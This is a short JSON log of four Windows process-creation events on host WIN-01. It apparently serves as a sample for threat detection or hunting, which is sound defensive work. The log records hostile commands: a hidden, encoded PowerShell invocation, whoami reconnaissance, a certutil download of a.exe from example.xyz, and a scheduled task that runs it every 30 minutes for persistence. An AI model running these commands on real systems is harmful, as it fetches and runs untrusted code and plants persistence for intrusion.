{"UtcTime":"2026-05-18T13:00:00Z","EventID":1,"Computer":"WIN-01","User":"ACME\\jdoe","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -enc SQBFAFgA","ParentImage":"C:\\Windows\\explorer.exe"}
{"UtcTime":"2026-05-18T13:03:00Z","EventID":1,"Computer":"WIN-01","User":"ACME\\jdoe","Image":"C:\\Windows\\System32\\whoami.exe","CommandLine":"whoami /all","ParentImage":"C:\\Windows\\System32\\cmd.exe"}
{"UtcTime":"2026-05-18T13:05:00Z","EventID":1,"Computer":"WIN-01","User":"ACME\\jdoe","Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache -split -f http://example.xyz/a.exe a.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe"}
{"UtcTime":"2026-05-18T13:10:00Z","EventID":1,"Computer":"WIN-01","User":"ACME\\jdoe","Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /create /sc minute /mo 30 /tn updater /tr C:\\Users\\Public\\a.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe"}
